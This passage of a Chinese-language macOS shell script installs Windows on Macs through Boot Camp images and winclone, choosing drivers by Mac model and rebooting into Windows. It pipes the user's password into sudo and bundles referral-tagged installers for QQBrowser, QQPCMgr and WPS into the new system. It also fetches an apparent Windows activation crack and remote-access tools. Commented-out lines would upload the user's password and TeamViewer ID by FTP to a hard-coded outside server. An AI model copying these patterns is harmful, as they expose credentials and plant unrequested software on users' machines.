echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi



if [ "$kzdcq" ]; then
if [ ! "$sip" ]; then
killall "System Preferences" >/dev/null 2>&1
echo "$pass" | sudo -S sudo diskutil mount disk0s1	
echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
exit
fi
fi

if [[ $modelxh != "10.5"* ]]; then
if [[ $modelxh != "10.6"* ]]; then
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
fi
fi

open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0
fi


if [ -f ~/Downloads/JG_Download/"$xtname2" ]; then
clear && printf "\e[3J"
echo


if [ "$soft" ]; then

if [ ! -f /tmp/rar.exe ]; then
/tmp/aria2c -c -o rar.exe  $ip5/1809.exe -d /tmp
if [ ! -f /tmp/rar.exe ]; then
read -s -n1 -p "部署文件无法下载，按任意键重试 ... "
Winxt
fi
fi

#/tmp/aria2c -c -o 360se+266372+n2ff5167499.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/360se+266372+n2ff5167499.exe -d /tmp
/tmp/aria2c -c -o QQBrowser_subid@202014_urlid@202014.exe --console-log-level=warn --summary-interval=888888888 https://cdn.zjbl.qq.com/app/QQBrowser_Setup_9.2.5170.402_9.2.exe -d /tmp
/tmp/aria2c -c -o qqpcmgr_202014.exe --console-log-level=warn --summary-interval=888888888 https://cdn.zjbl.qq.com/app/qqpcmgr_v15.0.22122.210_s1241.exe -d /tmp
/tmp/aria2c -c -o wpssetup_k3464024_206128.exe --console-log-level=warn --summary-interval=888888888 https://jifendownload.2345.cn/jifen_2345/wpssetup_k3464024_206128.exe -d /tmp
#/tmp/aria2c -c -o MarketSetup_266372.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/MarketSetup_266372.exe -d /tmp
#/tmp/aria2c -c -o 360zip_yqlm_266372.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/360zip_yqlm_266372.exe -d /tmp
fi

/tmp/aria2c -c -o bt.exe $ip5/bt.exe -d /tmp
	
mv ~/Downloads/JG_Download/"$xtname2" /tmp/boot.img.gz


if [ ! "$sip" ]; then
echo
if [[ $modelxh = "10.11"* ]]; then
Winclone555="1"
fi
else
if [ ! "$Winclone555" ]; then
if [[ $modelbb = *"MacBookPro9,2"* ]]; then
EFIWIN10="1"
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro9,1"* ]]; then
EFIWIN10="1"
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro10,2"* ]]; then
EFIWIN10="1"
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1013pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro10,1"* ]]; then
EFIWIN10="1"
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1013pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir5,1"* ]]; then
EFIWIN10="1"
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir5,2"* ]]; then
EFIWIN10="1"
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro8,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"Parallels14,1"* ]]; then
echo
else

echo
fi
fi
fi
fi
fi
fi
fi
fi
fi

fi


if [[ $modelxh = "10.10"* ]]; then
if [[ $modelbb = *"MacBookAir7,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookAir7,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBook8,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookAir6,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookAir6,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,3"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,4"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,5"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro12,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac17,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac16,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac16,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac15,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac14,4"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac14,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac14,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"Macmini7,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"Parallels14,1"* ]]; then
EFIWIN10="1"
else

echo
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi

if [[ $modelxh = "10.11"* ]]; then
if [[ $modelbb = *"MacBookAir7,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookAir7,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBook8,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookAir6,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookAir6,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,3"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,4"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro11,5"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"MacBookPro12,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac17,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac16,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac16,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac15,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac14,4"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac14,2"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"iMac14,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"Macmini7,1"* ]]; then
EFIWIN10="1"
else
if [[ $modelbb = *"Parallels14,1"* ]]; then
EFIWIN10="1"
else

echo
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi


#if [[ $modelbb = *"MacPro5,1"* ]]; then
#EFIWIN10="1"
#fi

if [ "$wzyp" ]; then
EFIWIN10="1"
fi

if [ "$EFIWIN10" ]; then
if [[ $modelxh = "10.10"* ]]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 --self-extract -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -e -p ${restore_device}
fi
else
if [[ $modelxh = "10.11"* ]]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 --self-extract -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -e -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone --self-extract -e -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -e -p ${restore_device} -i 1
fi
fi
fi
else
if [ "$Winclone555" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone5 --self-extract -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone --self-extract -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -p ${restore_device} -i 1
fi
fi
fi


if [ $? -ne 0 ] ; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/"$xtname2"
if [ "$EFIWIN10" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
fi
rm -rf /Volumes/EFI/EFI/APPLE/CACHES
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
if [[ $modelxh = "10.11"* ]]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -e -p ${restore_device}
fi
else
if [[ $modelxh = "10.10"* ]]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -e -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
fi
fi
if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
echo "安装失败！！！${restore_device}.请检查磁盘分区情况！"
exit -1
fi
else
clear && printf "\e[3J"
echo "安装失败！！！${restore_device}.请检查磁盘分区情况！"
exit -1
fi
fi

if [[ $modelxh = "10.10"* ]]; then
Winclone555="1"
fi

if [[ $modelxh = "10.11"* ]]; then
Winclone555="1"
fi

if [[ $modelxh = "12."* ]]; then
Winclone555="1"
fi

mv /tmp/boot.img.gz ~/Downloads/JG_Download/"$xtname2"

if [ "$Winclone555" ]; then
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -m ${restore_device}" password "$pass" with administrator privileges
EOD
if [ -e /Volumes/Windows ]; then
bootcamp_mounted="/Volumes/Windows"
fi
if [ -e /Volumes/BootCamp ]; then
bootcamp_mounted="/Volumes/BootCamp"
fi
else
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone -m ${restore_device})
fi
fi

cp /tmp/bt.exe "${bootcamp_mounted}/MBox/soft"
cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}"
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}"

if [ "$soft" ]; then
mv "${bootcamp_mounted}/MBox/soft/rar.exe" "${bootcamp_mounted}/MBox/soft/rar2.exe"
cp "/tmp/rar.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/QQBrowser_subid@202014_urlid@202014.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/360se+266372+n2ff5167499.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/qqpcmgr_202014.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/wpssetup_k3464024_206128.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/MarketSetup_266372.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/360zip_yqlm_266372.exe" "${bootcamp_mounted}/Mbox/soft"
fi

diskutil unmount ${restore_device}
diskutil mount ${restore_device}
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt

clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences" >/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi

if [ "$ydpaz" ]; then
echo "\033[36m移动盘，手动切换系统！！！\033[0m"
exit 0
fi


if [ "$kzdcq" ]; then
if [ ! "$sip" ]; then
if [ ! "$MBR10" ]; then
echo "$pass" | sudo -S sudo diskutil mount disk0s1	
echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
else
echo "$pass" | sudo -S sudo bless -mount /Volumes/BootCamp -setBoot -legacy -file /Volumes/BootCamp/bootmgr
fi
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
exit
fi
fi


if [[ $modelxh != "10.5"* ]]; then
if [[ $modelxh != "10.6"* ]]; then
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
fi
fi



open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0

fi


if [ "$DrvWin7" ]; then
clear && printf "\e[3J"
echo

if [ -f ~/Downloads/JG_Download/7x32.dmg ]; then
SourceMD5="8ff6d415ea398a25efb1636ae33f2b4d"
Drv7=""
Drvs=""
fi

if [ -f ~/Downloads/JG_Download/7x64.dmg ]; then
SourceMD5="6cb5729b3d505da8036e2d754dadb4ad"
Drv7="7x64"
Drvs="7x64"
fi

if [ -f ~/Downloads/JG_Download/New7.dmg ]; then
SourceMD5="bf55a66217f3d02c8864d0c52196a45c"
SourceMD52="d4b29ebda8a526fba259a77c70a43a88"
Drv7="New7"
Drvs="New7"
MSND7="1"
fi

if [ -f ~/Downloads/JG_Download111/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso ]; then
index="4"
Drv7=""
Drvs="New7"
MSND7="1"
hdiutil attach ~/Downloads/JG_Download/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso

if [ ! -f "/tmp/Windows.wim" ]; then

if [ "$Winclone555" ]; then
/tmp/tools/bin/wimexport /Volumes/GSP1RMCULXFRER_CN_DVD/sources/install.wim 4 /tmp/Windows.wim
else
if [[ $modelxh = "10.11"* ]]; then
/tmp/tools/bin/wimexport /Volumes/GSP1RMCULXFRER_CN_DVD/sources/install.wim 4 /tmp/Windows.wim
else
cp /Volumes/GSP1RMCULXFRER_CN_DVD/sources/install.wim /tmp/Windows.wim
fi
fi

fi
else
index="1"
fi

if [ "$mjh7" ]; then
/tmp/aria2c -c -o "Windows Loader.exe"  "$ip5/Windows Loader.exe" -d /tmp
fi

if [ "$Drvs" ]; then

if [ ! -f /tmp/Drv.zip ]; then
/tmp/aria2c -c -o Drv.zip  $ip5/"$Drvs".zip -d /tmp
fi

if [ ! -f /tmp/Drv.zip ]; then
read -s -n1 -p "部署文件无法下载，按任意键重试 ... "
Winxt
fi

unzip -o "/tmp/Drv.zip" -d "/tmp">/dev/null 2>&1
fi

if [ "$soft" ]; then

#/tmp/aria2c -c -o 360se+266372+n2ff5167499.exe http://dl.360safe.com/netunion/20140425/360se+266372+n2ff5167499.exe -d /tmp
/tmp/aria2c -c -o QQBrowser_subid@202014_urlid@202014.exe https://cdn.zjbl.qq.com/app/QQBrowser_Setup_9.2.5170.402_9.2.exe -d /tmp
/tmp/aria2c -c -o qqpcmgr_202014.exe https://cdn.zjbl.qq.com/app/qqpcmgr_v15.0.22122.210_s1241.exe -d /tmp
/tmp/aria2c -c -o wpssetup_k3464024_206128.exe http://jifendownload.2345.cn/jifen_2345/wpssetup_k3464024_206128.exe -d /tmp

if [ ! -f /tmp/qqpcmgr_202014.exe ]; then
/tmp/aria2c -c -o qqpcmgr_202014.exe http://down.bfxitong.com/sqsoft/qqpcmgr_129017.exe -d /tmp
fi
if [ ! -f /tmp/QQBrowser_subid@202014_urlid@202014.exe ]; then
/tmp/aria2c -c -o QQBrowser_subid@202014_urlid@202014.exe http://down.bfxitong.com/sqsoft/QQBrowser_subid@129017_urlid@129017.exe -d /tmp
fi

if [ "$MSND7" ]; then
/tmp/aria2c -c -o MarketSetup_266372.exe http://dl.360safe.com/netunion/20140425/MarketSetup_266372.exe -d /tmp
/tmp/aria2c -c -o 360zip_yqlm_266372.exe http://dl.360safe.com/netunion/20140425/360zip_yqlm_266372.exe -d /tmp
/tmp/aria2c -c -o TeamViewerQS.exe http://tv-static-net.oss-cn-beijing.aliyuncs.com/download/tv15/TeamViewerQS.exe -d /tmp
/tmp/aria2c -c -o ToDesk.exe http://dl.todesk.com/windows/ToDesk_Lite.exe -d /tmp
fi
fi

if [ "$MSND7" ]; then
if [ ! "$mjh7" ]; then
echo	
#/tmp/aria2c -c -o Loader.zip  $ip5/Loader.zip -d /tmp
#unzip -o "/tmp/Loader.zip" -d "/tmp">/dev/null 2>&1
fi
fi


if [ ! -f ~/Downloads/JG_Download/"$SourceMD5" ]; then
	echo
	echo "正在校验文件中..."
	TargetMD5=$(md5 ~/Downloads/JG_Download/"$xtname3")
	TargetMD5=${TargetMD5##* }
	if [ "$TargetMD5" = "$SourceMD5" ]
	then
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：正确"
		echo "$TargetMD5" > ~/Downloads/JG_Download/"$TargetMD5"
	else
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：错误"
		echo
		read -s -n1 -p "请按任意键返回，重新下载 ... "
		Start_menu
	fi
	fi

	
	
	
if [ "$Winclone222" ]; then	
	
if [[ $xtname3 = "7x32.dmg" ]]; then
mv ~/Downloads/JG_Download/"$xtname3" /private/tmp/732.winclone/boot.img.gz	
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/private/tmp/winclone.perl -restore -image_dir=/private/tmp/732.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /private/tmp/winclone.perl -restore -image_dir=/private/tmp/732.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q	
fi
if [ $? -ne 0 ] ; then
mv /private/tmp/732.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
clear && printf "\e[3J"
echo
echo
echo "安装失败！！!请通知技术员！！！"
echo
echo
exit
else
mv /private/tmp/732.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
fi
fi	
if [[ $xtname3 = "7x64.dmg" ]]; then
mv ~/Downloads/JG_Download/"$xtname3" /private/tmp/764.winclone/boot.img.gz		
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/private/tmp/winclone.perl -restore -image_dir=/private/tmp/764.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /private/tmp/winclone.perl -restore -image_dir=/private/tmp/764.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q
fi
if [ $? -ne 0 ] ; then
mv /private/tmp/764.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
clear && printf "\e[3J"
echo
echo
echo "安装失败！！!请通知技术员！！！"
echo
echo
exit
else
mv /private/tmp/764.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
fi
fi		



#diskutil unmount ${restore_device}

#echo "$pass" | sudo -S sudo /private/tmp/ntfscp -f ${restore_device} ~/Downloads/JG_Download/BootCamp"$btap".zip BootCamp.zip

killall "System Preferences" >/dev/null 2>&1
clear && printf "\e[3J"
echo
echo
echo "安装完成！！!请通知技术员！！！"
echo
echo

if [ "$kzdcq" ]; then
if [ ! "$sip" ]; then
echo "$pass" | sudo -S sudo bless -mount /Volumes/BootCamp -setBoot -legacy -file /Volumes/BootCamp/bootmgr
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
exit
fi
fi



open /System/Library/PreferencePanes/StartupDisk.prefPane
echo
echo
exit

fi	
	
	
	
if [ "$Winclone111" ]; then	
	
if [[ $xtname3 = "7x32.dmg" ]]; then
mv ~/Downloads/JG_Download/"$xtname3" /private/tmp/732.winclone/boot.img.gz	
echo "$pass" | sudo -S sudo /private/tmp/winclone.perl -restore -image_dir=/private/tmp/732.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q	
if [ $? -ne 0 ] ; then
mv /private/tmp/732.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
clear && printf "\e[3J"
echo
echo
echo "安装失败！！!请通知技术员！！！"
echo
echo
exit
else
mv /private/tmp/732.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
fi
fi
if [[ $xtname3 = "7x64.dmg" ]]; then
mv ~/Downloads/JG_Download/"$xtname3" /private/tmp/764.winclone/boot.img.gz
echo "$pass" | sudo -S sudo /private/tmp/winclone.perl -restore -image_dir=/private/tmp/764.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q
if [ $? -ne 0 ] ; then
mv /private/tmp/764.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
clear && printf "\e[3J"
echo
echo
echo "安装失败！！!请通知技术员！！！"
echo
echo
exit
else
mv /private/tmp/764.winclone/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
fi
fi		



#diskutil unmount ${restore_device}

#echo "$pass" | sudo -S sudo /private/tmp/ntfscp -f ${restore_device} ~/Downloads/JG_Download/BootCamp"$btap".zip BootCamp.zip

clear && printf "\e[3J"
echo
echo
echo "安装完成！！!请通知技术员！！！"
echo
echo
open /System/Library/PreferencePanes/StartupDisk.prefPane
echo
echo
exit

fi		
	
	
	
	
mv ~/Downloads/JG_Download/"$xtname3" /tmp/boot.img.gz



if [[ $modelbb = "MacBookPro12,1" ]]; then
if [[ $modelxh = "10.10"* ]]; then
modelxh="10.11"
EFIWIN7="1"
else
EFIWIN7="1"
fi
fi

if [[ $modelbb = "MacBookAir7,2" ]]; then
if [[ $modelxh = "10.10"* ]]; then
modelxh="10.11"
EFIWIN7="1"
else
EFIWIN7="1"
fi
fi


if [ ! "$sip" ]; then
echo
if [[ $modelxh = "10.11"* ]]; then
Winclone555="1"
fi
else
if [ ! "$Winclone555" ]; then
EFIWIN7="1"
fi
if [ ! "$Winclone555" ]; then
if [ ! "$Winclone222" ]; then
EFIWIN7="1"
fi
fi
if [ ! "$Winclone555" ]; then
if [ ! "$Winclone222" ]; then
if [ ! "$Winclone111" ]; then
EFIWIN7="1"
fi
fi
fi
fi

if [ "$EFIWIN7" ]; then
curl -# -C - --connect-timeout 10 -o /tmp/EFIboot.zip "$ip4/dos/EFIboot.zip">/dev/null 2>&1
unzip -o "/tmp/EFIboot.zip" -d "/tmp">/dev/null 2>&1

if [[ $modelbb = *"MacBookAir5,2"* ]]; then
xianka="1"
fi
if [[ $modelbb = *"MacBookAir5,1"* ]]; then
xianka="1"
fi
if [[ $modelbb = *"MacBookAir4,2"* ]]; then
xianka="1"
fi
if [[ $modelbb = *"MacBookAir4,1"* ]]; then
xianka="1"
fi
if [[ $modelbb = *"Macmini5,1"* ]]; then
xianka="1"
fi
if [[ $modelbb = *"Macmini5,2"* ]]; then
xianka="1"
fi
if [[ $modelbb = *"MacBookPro8,2"* ]]; then
xianka="1"
fi
if [[ $modelbb = *"MacBookPro8,3"* ]]; then
xianka="1"
fi

if [[ $modelbb = *"MacBookPro8,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro8,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro8,3"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro9,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w712pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro9,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w712pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro10,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w713pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro10,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w713pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"iMac12,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711imac.exe">/dev/null 2>&1
else
if [[ $modelbb = *"iMac12,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711imac.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir5,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w712air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir5,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w712air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir4,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir4,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"Macmini5,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711mini.exe">/dev/null 2>&1
else
if [[ $modelbb = *"Macmini5,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w711mini.exe">/dev/null 2>&1
else
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/btw7.exe">/dev/null 2>&1
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi



if [ "$EFIWIN7" ]; then
if [[ $modelxh = "10.11"* ]]; then
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -e -p ${restore_device}
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -e -p ${restore_device} -i $index
fi
else
if [ "$Winclone555" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone5 --self-extract -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone --self-extract -l -p ${restore_device} -i $index" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -l -p ${restore_device} -i $index
fi
fi
fi


if [ $? -ne 0 ] ; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/"$xtname3"
if [ "$EFIWIN7" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
fi
